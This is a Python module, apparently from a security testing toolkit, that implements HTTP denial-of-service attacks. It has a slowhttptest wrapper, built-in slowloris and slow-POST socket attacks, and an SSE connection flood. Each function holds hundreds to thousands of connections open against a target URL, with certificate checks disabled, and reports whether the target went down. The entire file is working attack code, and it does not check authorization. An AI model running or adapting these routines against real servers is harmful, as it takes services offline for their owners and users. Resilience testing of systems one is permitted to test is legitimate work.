from __future__ import annotations

import asyncio
import os
import socket
import ssl
import tempfile
import time
from urllib.parse import urlparse

import aiohttp

from ._base import _run_cmd, _tool_available
from .state import STATE


async def slowhttptest_attack(
    url: str, attack_type: str = "slowloris",
    num_connections: int = 1000, duration_seconds: int = 30, rate: int = 200,
) -> dict:
    num_connections = min(num_connections, 5000)
    duration_seconds = min(duration_seconds, 120)

    if not _tool_available("slowhttptest"):
        parsed = urlparse(url)
        if attack_type == "slowloris":
            return await _builtin_slowloris(
                parsed.hostname,
                parsed.port or (443 if parsed.scheme == "https" else 80),
                num_connections, duration_seconds,
            )
        if attack_type == "slow_post":
            return await _builtin_slow_post(url, num_connections, duration_seconds)
        return {"error": "slowhttptest not installed, built-in fallback limited to slowloris/slow_post"}

    flag_map = {
        "slowloris": ["-H"], "slow_post": ["-B"], "slow_read": ["-X"], "range": ["-R"],
    }
    with tempfile.NamedTemporaryFile(suffix=".csv", delete=False) as tmp:
        tmp_path = tmp.name

    cmd = (
        ["slowhttptest"] + flag_map.get(attack_type, ["-H"]) +
        ["-c", str(num_connections), "-r", str(rate), "-l", str(duration_seconds),
         "-i", "10", "-u", url, "-p", "3", "-o", tmp_path]
    )
    result = await _run_cmd(cmd, timeout=duration_seconds + 30)

    service_available = True
    try:
        with open(tmp_path + ".csv") as f:
            lines = f.read().strip().split("\n")
            if len(lines) > 1:
                last = lines[-1].split(",")
                if len(last) > 2:
                    service_available = int(last[2]) > 0
        os.unlink(tmp_path + ".csv")
    except Exception:
        pass
    try:
        os.unlink(tmp_path)
    except Exception:
        pass

    return {
        "url": url, "attack_type": attack_type,
        "connections": num_connections, "duration_seconds": duration_seconds,
        "service_available_at_end": service_available,
        "raw_output": result.get("stdout", "")[:5000],
        "assessment": "target_degraded_or_down" if not service_available else "target_survived",
    }


async def _builtin_slowloris(
    host: str, port: int = 80, num_connections: int = 500, duration_seconds: int = 30,
) -> dict:
    num_connections = min(num_connections, 2000)
    duration_seconds = min(duration_seconds, 120)
    sockets: list[socket.socket] = []
    connected = 0

    def _create(h: str, p: int) -> socket.socket | None:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            if p == 443:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=h)
            s.connect((h, p))
            s.send(f"GET /?{time.monotonic()} HTTP/1.1\r\n".encode())
            s.send(f"Host: {h}\r\n".encode())
            s.send(b"User-Agent: Mozilla/5.0\r\n")
            return s
        except Exception:
            return None

    loop = asyncio.get_running_loop()
    tasks = [loop.run_in_executor(None, _create, host, port) for _ in range(num_connections)]
    for s in await asyncio.gather(*tasks):
        if s is not None:
            sockets.append(s)
            connected += 1

    start_time = time.monotonic()
    rounds = 0
    maintained = connected

    while time.monotonic() - start_time < duration_seconds and sockets:
        rounds += 1
        alive = []
        for s in sockets:
            try:
                s.send(f"X-a: {rounds}\r\n".encode())
                alive.append(s)
            except Exception:
                try:
                    s.close()
                except Exception:
                    pass
        sockets = alive
        maintained = len(sockets)
        await asyncio.sleep(1)

    for s in sockets:
        try:
            s.close()
        except Exception:
            pass

    return {
        "host": host, "port": port, "type": "slowloris_builtin",
        "initial_connections": connected, "final_maintained": maintained,
        "keep_alive_rounds": rounds,
        "assessment": "vulnerable" if maintained > num_connections * 0.3 else "resistant",
    }


async def _builtin_slow_post(url: str, num_connections: int = 200, duration_seconds: int = 30) -> dict:
    num_connections = min(num_connections, 1000)
    duration_seconds = min(duration_seconds, 120)
    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"
    sockets: list[socket.socket] = []
    connected = 0

    def _create() -> socket.socket | None:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            if parsed.scheme == "https":
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=host)
            s.connect((host, port))
            s.send(
                f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 100000\r\n\r\n".encode()
            )
            return s
        except Exception:
            return None

    loop = asyncio.get_running_loop()
    for s in await asyncio.gather(*[loop.run_in_executor(None, _create) for _ in range(num_connections)]):
        if s is not None:
            sockets.append(s)
            connected += 1

    start_time = time.monotonic()
    rounds = 0
    maintained = connected
    bytes_sent = 0

    while time.monotonic() - start_time < duration_seconds and sockets:
        rounds += 1
        alive = []
        for s in sockets:
            try:
                s.send(b"A")
                bytes_sent += 1
                alive.append(s)
            except Exception:
                try:
                    s.close()
                except Exception:
                    pass
        sockets = alive
        maintained = len(sockets)
        await asyncio.sleep(1)

    for s in sockets:
        try:
            s.close()
        except Exception:
            pass

    return {
        "url": url, "type": "slow_post_builtin",
        "initial_connections": connected, "final_maintained": maintained,
        "bytes_trickled": bytes_sent,
        "assessment": "vulnerable" if maintained > num_connections * 0.3 else "resistant",
    }


async def sse_flood(url: str, num_connections: int = 200, duration_seconds: int = 30) -> dict:
    num_connections = min(num_connections, 1000)
    duration_seconds = min(duration_seconds, 60)

    connected = 0
    rejected = 0
    active: list[tuple] = []
    lock = asyncio.Lock()

    async def _hold(target: str):
        nonlocal connected, rejected
        try:
            sess = aiohttp.ClientSession()
            resp = await asyncio.wait_for(
                sess.get(
                    target,
                    headers={"Accept": "text/event-stream", "Cache-Control": "no-cache"},
                    ssl=False,
                    timeout=aiohttp.ClientTimeout(connect=5, total=duration_seconds + 10),
                ),
                timeout=6,
            )
            async with lock:
                if resp.status == 200:
                    connected += 1
                    active.append((sess, resp))
                else:
                    rejected += 1
                    await resp.release()
                    await sess.close()
        except Exception:
            async with lock:
                rejected += 1

    tasks = [asyncio.create_task(_hold(url)) for _ in range(num_connections)]
    await asyncio.gather(*tasks, return_exceptions=True)
    await asyncio.sleep(duration_seconds)

    for sess, resp in active:
        try:
            await resp.release()
            await sess.close()
        except Exception:
            pass

    return {
        "url": url, "attempted": num_connections,
        "connected": connected, "rejected": rejected,
        "held_seconds": duration_seconds,
        "vulnerable": connected > num_connections * 0.3,
        "assessment": f"Held {connected}/{num_connections} SSE connections for {duration_seconds}s",
    }
